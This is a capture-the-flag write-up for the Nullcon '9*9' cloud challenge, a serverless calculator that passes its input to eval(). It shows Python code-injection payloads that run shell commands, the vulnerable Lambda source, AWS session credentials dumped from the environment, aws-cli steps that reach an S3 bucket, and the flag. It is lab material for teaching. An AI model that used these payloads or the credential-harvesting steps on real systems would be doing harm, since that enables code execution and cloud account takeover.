# 9\*9
```
Type: Cloud
Plateform : Nullcon
Difficulty : [x] [x] [] [] []
Tools : burpsuite, aws-cli
```

#### DESCRIPTION
Our new serverless calculator can solve any calulation super fast.
** The Cloud security challenges are provided by SEC Consult **


#### STEP 1
With burpsuite, intercept requests to make input injection
```
{"input":"__import__('subprocess').getoutput('ls')"}
{"result":"lambda-function.py"}
```

Then, display the `lambda-function.py` file: 
```
{"input":"__import__('subprocess').getoutput('cat lambda-function.py')"}

import json
def lambda_handler(event, context):
    return {
        'result' : eval(event['input'])
        #flag in nullcon-s3bucket-flag4 ......
    }
```

#### STEP 2
In the step 1, we can see AWS s3 instance : `nullcon-s3bucket-flag4`</br>
Trying to retrieve AWS credentials in environment:
```
--> AWS_SESSION_TOKEN=IQoJb3JpZ2luX2VjEAcaDGV1LWNlbnRyYWwtMSJHMEUCIGF+LMBxMOcvPQVrwbSkjXWRJFZVHK+wx+D5DhuUjR0tAiEAqiCHUjQoqidDoKieDNKgBgQ6TQhcI5QgjAFHHDgCzV4qggMIgP//////////ARAAGgw3NDMyOTYzMzA0NDAiDBJ/7u8t2aFGIZrRPCrWAjYY7tXceU9NivvGu6fCn+nmeSLbWs0Ltpp556fdwT0ruQueROH1EouOTXp9FXEEYwdSx7srJeYfO2boOOvqo8/6ABWv5VnV0KZltIY+iHcfbUofJlm5109YUBzwabVcBWUqUH6RIXxiQhg53cQCdk7xc+GILYq7I0uaKajgQ1QvnbuARlCZFBAkgz7d+3g9TKEkF8ZuwFxFcUf2/1M3b8KJwZ6lLPEI2BuA0PLROggbx2Mi1gHWl8wxZB8b37mb6JX9DLZdTBg0Joc90KrUYPsZercWZG1G552g8Xs+BzwaQuGgRm1Gq4ZWvD3SfVF3eGHZ6lICRBv/8FRueJwdy/TsJihfZJXZ1+vvOyVV/42RH6LnlRKKQWNg0hBX57BQLrBbkWm2QK8LUWLENXpbY/CiOx4r7GdmltDRJpnI8ep8x9bh+tJyK5rJZMdh3GxJohG3XfOYtjDZjpCYBjqeAfXNGrh5FO+pQ34D2a24GZI5CZbXJeFs86lP+42nqPXiAFDsDBD97RUhwg+lId9zaKWU7ReGpAI/g1gQgONUmsOwOQ6NPKu5pMhb8yGFwUW87AqHnUnXeDHLipjFFj20DJ9o6BmsWl4+fGtdshv4B0Lycs2/r7dN4XXvM/nzNE2vHVijNJ6cIqus05Jsk+U1cR8vko5dfwwRhudQhgI8
--> AWS_SECRET_ACCESS_KEY=6gTsudKRsULSWGByqHB3zXrEeTmFu+krZk2x7gr7
--> AWS_ACCESS_KEY_ID=ASIA22D7J5LEKRRYVDDI
```

#### STEP 3
We are approaching the goal,</br>
now we just have to connect to the instance and then retrieve the flag:
```
$ aws configure
AWS Access Key ID [None]: ASIA22D7J5LEKRRYVDDI
AWS Secret Access Key [None]: 6gTsudKRsULSWGByqHB3zXrEeTmFu+krZk2x7gr7
Default region name [None]: eu-central-1

$ aws s3 ls nullcon-s3bucket-flag4
2022-08-11 22:27:20         40 flag4.txt

$ aws s3 cp s3://nullcon-s3bucket-flag4/flag4.txt .
--> cat flag4.txt
```

#### FLAG
`==> ENO{L4mbda_make5_yu0_THINK_OF_ENVeryone}`
